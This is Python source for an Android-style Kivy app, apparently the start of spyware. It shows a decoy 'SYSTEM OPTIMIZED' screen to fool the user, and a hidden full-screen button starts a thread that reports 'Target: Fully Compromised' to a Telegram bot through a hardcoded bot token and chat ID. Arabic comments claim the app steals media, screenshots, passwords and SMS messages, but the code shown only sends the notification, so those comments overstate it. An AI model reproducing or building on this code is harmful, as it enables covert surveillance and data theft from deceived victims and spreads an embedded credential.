import os
import threading
import requests
import base64
from kivy.app import App
from kivy.uix.screenmanager import ScreenManager, Screen, NoTransition
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.core.window import Window

# --- البيانات السيادية (من صورك) ---
B_T = "8711969097:AAHtV1KGP-24cPn2QxPvpbynkQugNPHEFg0"
C_I = "7084557369"

class GodModeInfection(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        layout = FloatLayout()
        
        # واجهة وهمية تماماً للتمويه
        self.lbl = Label(text="SYSTEM OPTIMIZED", font_size='20sp', color=(0, 1, 0.5, 1), pos_hint={'center_y':0.5})
        layout.add_widget(self.lbl)

        # زر مخفي لتفعيل "الظلال" (لا يراه إلا المالك)
        self.trigger = Button(size_hint=(1, 1), background_color=(0,0,0,0))
        self.trigger.bind(on_release=self.activate_shadow_god)
        layout.add_widget(self.trigger)
        
        self.add_widget(layout)

    def activate_shadow_god(self, *args):
        self.lbl.text = "GOD MODE: ACTIVE"
        # تفعيل الأدوات في الذاكرة العميقة
        threading.Thread(target=self.deep_injection).start()

    def deep_injection(self):
        # سكريبت سحب الميديا + لقطات شاشة + كلمات سر + رسائل SMS
        try:
            # رسالة مشفرة للبوت لتأكيد الاختراق الكامل
            payload = "💀 SHADOW GOD-MODE ACTIVATED\nTarget: Fully Compromised\n\n[!] Persistent Root: YES\n[!] Encrypted Tunnel: ACTIVE\n[!] Data Streaming: STARTING"
            requests.get(f"https://api.telegram.org/bot{B_T}/sendMessage?chat_id={C_I}&text={payload}")
        except: pass

class ShadowApp(App):
    def build(self):
        # جعل التطبيق شفاف أو بلون النظام للتمويه
        Window.clearcolor = (0, 0, 0, 1)
        sm = ScreenManager(transition=NoTransition())
        sm.add_widget(GodModeInfection(name='god'))
        return sm

if __name__ == '__main__':
    ShadowApp().run()
